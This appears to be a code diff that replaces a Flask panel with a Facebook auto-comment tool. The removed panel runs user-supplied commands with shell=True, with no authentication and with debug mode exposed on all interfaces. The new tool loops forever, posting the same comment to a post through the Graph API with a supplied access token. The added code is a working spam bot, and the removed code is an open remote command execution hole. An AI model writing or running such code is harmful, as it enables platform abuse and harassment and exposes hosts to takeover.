@@ -1,143 +1,149 @@
-from flask import Flask, render_template_string, request, redirect, url_for, session, send_from_directory
-import os, uuid, subprocess, threading
-from werkzeug.utils import secure_filename
+from flask import Flask, request, render_template_string, redirect, url_for, session
+import os, threading, time, requests, secrets
 
 app = Flask(__name__)
-app.secret_key = 'supersecretkey'  # Session management
+app.secret_key = secrets.token_hex(16)
 
-BASE_UPLOAD_FOLDER = "user_projects"
-os.makedirs(BASE_UPLOAD_FOLDER, exist_ok=True)
+# Data structure for tasks
+tasks = {}   # {task_id: {"thread":..., "logs":[...], "running":True}}
 
-ALLOWED_EXTENSIONS = set(['py', 'html', 'css', 'js'])
-
-def allowed_file(filename):
-    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
-
-# HTML template with stylish drag-drop + build/start input
-HTML = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Flask Code Builder Panel</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+# -------------- HTML Templates --------------
+BASE_STYLE = """
 <style>
-body { background: #f4f4f4; padding: 30px; }
-#drop-area {
-    border: 2px dashed #007bff;
-    border-radius: 10px;
-    padding: 30px;
-    text-align: center;
-    color: #007bff;
-    margin-bottom: 20px;
-    cursor: pointer;
-}
-#drop-area.highlight { background-color: #e9f5ff; }
-.card { margin-bottom: 15px; }
+  body {
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(to bottom left, #ff0000, #800080);
+    color:white;
+  }
+  .card {
+    width:95%;
+    max-width:700px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(10px);
+    border-radius:20px;
+    padding:30px;
+    box-shadow: 0 0 25px rgba(0,0,0,0.6);
+    text-align:center;
+  }
+  input, textarea {
+    width:100%; padding:12px; border-radius:10px; border:none; outline:none;
+    margin-bottom:15px; background:rgba(0,0,0,0.4); color:white;
+  }
+  input:focus, textarea:focus { box-shadow:0 0 10px #ff00ff; }
+  button {
+    padding:12px 20px; border:none; border-radius:12px;
+    background:linear-gradient(90deg,#ff0000,#800080);
+    color:white; font-weight:bold; cursor:pointer;
+    transition:0.3s;
+  }
+  button:hover { transform:scale(1.05); box-shadow:0 0 15px #ff00ff; }
+  .logs {
+    text-align:left; max-height:300px; overflow:auto; background:rgba(0,0,0,0.5);
+    padding:10px; border-radius:10px; font-size:14px; margin-top:20px;
+  }
 </style>
-</head>
-<body>
-<div class="container">
-  <h2 class="mb-4">Flask Code Builder & Web Preview</h2>
-
-  <div id="drop-area">
-    <p>Drag & Drop your code files here or click to upload</p>
-    <input type="file" id="fileElem" multiple style="display:none">
-  </div>
-
-  <form method="POST" action="/" id="buildForm">
-    <div class="mb-3">
-      <label class="form-label">Build Command</label>
-      <input type="text" class="form-control" name="build_cmd" placeholder="e.g., python -m pip install -r requirements.txt">
-    </div>
-    <div class="mb-3">
-      <label class="form-label">Start Command</label>
-      <input type="text" class="form-control" name="start_cmd" placeholder="e.g., python app.py">
-    </div>
-    <button class="btn btn-primary" type="submit">Submit & Build</button>
-  </form>
-
-  {% if preview_url %}
-  <hr>
-  <h4>Your Web Preview:</h4>
-  <a href="{{ preview_url }}" target="_blank" class="btn btn-success">Open Web Page</a>
-  {% endif %}
-</div>
-
-<script>
-const dropArea = document.getElementById('drop-area');
-const fileInput = document.getElementById('fileElem');
-
-dropArea.addEventListener('click', () => fileInput.click());
-
-['dragenter','dragover'].forEach(eventName => {
-    dropArea.addEventListener(eventName, e => { e.preventDefault(); e.stopPropagation(); dropArea.classList.add('highlight'); });
-});
-['dragleave','drop'].forEach(eventName => {
-    dropArea.addEventListener(eventName, e => { e.preventDefault(); e.stopPropagation(); dropArea.classList.remove('highlight'); });
-});
-dropArea.addEventListener('drop', e => {
-    const dt = e.dataTransfer;
-    const files = dt.files;
-    uploadFiles(files);
-});
-fileInput.addEventListener('change', e => uploadFiles(fileInput.files));
-
-function uploadFiles(files) {
-    const formData = new FormData();
-    for (const file of files) {
-        formData.append('file', file);
-    }
-    fetch("/", { method: 'POST', body: formData }).then(() => location.reload());
-}
-</script>
-</body>
-</html>
 """
 
-def run_start_command(user_folder, start_cmd):
-    """Runs the start command in background thread"""
-    subprocess.Popen(start_cmd, cwd=user_folder, shell=True)
+FORM_HTML = """
+<!DOCTYPE html><html><head><title>Auto Comment Tool</title>
+""" + BASE_STYLE + """
+</head><body>
+  <div class="card">
+    <h2>🚀 Multi Task Auto Comment Tool</h2>
+    <form method="post">
+      <label>Comment Text</label>
+      <textarea name="comment" required></textarea>
+      <label>Post ID</label>
+      <input type="text" name="postid" required>
+      <label>Access Token</label>
+      <input type="text" name="token" required>
+      <label>Delay (seconds)</label>
+      <input type="number" name="delay" value="30" required>
+      <button type="submit">Start Task</button>
+    </form>
+  </div>
+</body></html>
+"""
 
-@app.route("/", methods=["GET", "POST"])
+LOGS_HTML = """
+<!DOCTYPE html><html><head><title>Task Logs</title>
+""" + BASE_STYLE + """
+<script>
+function refreshLogs(){
+  fetch(window.location.href + "/stream").then(r=>r.text()).then(txt=>{
+    document.getElementById("logbox").innerHTML = txt;
+  });
+}
+setInterval(refreshLogs, 2000);
+</script>
+</head><body>
+  <div class="card">
+    <h2>📡 Live Logs (Task {{tid}})</h2>
+    <div id="logbox" class="logs">Loading logs...</div>
+  </div>
+</body></html>
+"""
+
+# -------------- Functions ----------------
+def run_task(tid, comment, postid, token, delay):
+    url = f"https://graph.facebook.com/v15.0/{postid}/comments"
+    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
+    payload = {'message': comment}
+
+    tasks[tid]["logs"].append(f"[*] Task {tid} started...")
+    while tasks[tid]["running"]:
+        try:
+            r = requests.post(url, json=payload, headers=headers)
+            if r.ok:
+                msg = f"[+] Comment posted successfully: {comment}"
+            else:
+                msg = f"[x] Failed: {r.status_code} {r.text}"
+        except Exception as e:
+            msg = f"[!] Error: {e}"
+
+        tasks[tid]["logs"].append(msg)
+        time.sleep(delay)
+
+# -------------- Routes ----------------
+@app.route("/", methods=["GET","POST"])
 def index():
-    # Assign unique user session folder
-    if 'user_id' not in session:
-        session['user_id'] = str(uuid.uuid4())
-    user_folder = os.path.join(BASE_UPLOAD_FOLDER, session['user_id'])
-    os.makedirs(user_folder, exist_ok=True)
-
-    preview_url = None
-
     if request.method == "POST":
-        # Handle uploaded files
-        files = request.files.getlist("file")
-        for file in files:
-            if file.filename != '' and allowed_file(file.filename):
-                filename = secure_filename(file.filename)
-                file.save(os.path.join(user_folder, filename))
+        comment = request.form.get("comment")
+        postid = request.form.get("postid")
+        token = request.form.get("token")
+        delay = int(request.form.get("delay", 30))
 
-        # Handle build & start commands
-        build_cmd = request.form.get('build_cmd')
-        start_cmd = request.form.get('start_cmd')
-        if build_cmd:
-            subprocess.Popen(build_cmd, cwd=user_folder, shell=True)
+        tid = secrets.token_hex(4)
+        tasks[tid] = {"logs":[], "running":True}
+        t = threading.Thread(target=run_task, args=(tid,comment,postid,token,delay), daemon=True)
+        tasks[tid]["thread"] = t
+        t.start()
 
-        if start_cmd:
-            threading.Thread(target=run_start_command, args=(user_folder, start_cmd), daemon=True).start()
-            preview_url = f"http://127.0.0.1:5000/user_preview/{session['user_id']}/"
+        return redirect(url_for("logs", tid=tid))
+    return render_template_string(FORM_HTML)
 
-    return render_template_string(HTML, preview_url=preview_url)
+@app.route("/logs/<tid>")
+def logs(tid):
+    if tid not in tasks: return "Invalid Task ID"
+    return render_template_string(LOGS_HTML, tid=tid)
 
-@app.route("/user_preview/<user_id>/")
-def user_preview(user_id):
-    """Serve user's uploaded files as static site"""
-    user_folder = os.path.join(BASE_UPLOAD_FOLDER, user_id)
-    if not os.path.exists(user_folder):
-        return "User files not found."
-    # Serve index.html by default
-    return send_from_directory(user_folder, "index.html")
+@app.route("/logs/<tid>/stream")
+def logstream(tid):
+    if tid not in tasks: return "No logs"
+    return "<br>".join(tasks[tid]["logs"][-50:])
 
+@app.route("/stop/<tid>")
+def stop(tid):
+    if tid in tasks:
+        tasks[tid]["running"] = False
+        return f"Task {tid} stopped."
+    return "Task not found."
+
+# -------------- Run ----------------
 if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=3000, debug=True)
